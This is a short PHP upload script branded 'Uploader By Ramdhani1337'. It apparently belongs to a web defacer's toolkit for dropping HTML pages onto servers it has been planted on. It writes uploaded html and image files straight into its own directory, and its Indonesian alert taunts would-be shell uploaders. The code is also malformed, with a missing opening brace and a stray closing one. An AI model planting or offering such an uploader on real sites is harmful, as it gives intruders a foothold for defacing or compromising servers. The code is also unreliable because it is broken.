<center>
	<h3>Uploader By Ramdhani1337 "</h3><br>
<form method="post" enctype="multipart/form-data">
<input type="file" name="file">
<br>
<button name="gas">up!</button>
<?php

if(isset($_POST['gas']))

$nama = $_FILES['file']['name'];
$gagal = $_FILES['file']['error'];
   $tmp = $_FILES['file']['tmp_name'];
		
		$ext = ['html', 'jpg', 'jpeg', 'png'];
		$extg = explode('.', $nama);
		$extg = strtolower(end($extg));
		if ( !in_array($extg, $ext)) {
		  echo "<script>alert('MAU APLOD SHELL YA BILANG SATIYA GANS DOLOE')</script>";
		return false;
		}
	
	$up = move_uploaded_file($tmp, $nama);
	
	if ($up){
		echo "<br><br>sukses";
		}else{
		echo "<br><br>gagal";
		
	}
}
?>
